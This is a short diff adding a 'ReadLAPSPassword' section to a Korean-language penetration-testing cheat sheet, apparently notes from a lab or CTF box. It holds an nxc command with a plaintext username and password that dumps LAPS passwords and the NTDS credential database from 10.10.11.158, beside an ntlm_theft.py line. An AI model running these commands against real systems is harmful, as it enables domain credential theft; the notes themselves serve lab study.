@@ -918,3 +918,14 @@ python3 ntlm_theft.py -g all -s 127.0.0.1 -f test
 ```
   
 </details>
+
+---
+<details>
+  <summary><strong>ReadLAPSPassword</strong></summary>
+
+- `nxc`를 사용해서 침투 가능.
+```bash
+nxc smb 10.10.11.158 -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' --laps --ntds
+```
+  
+</details>
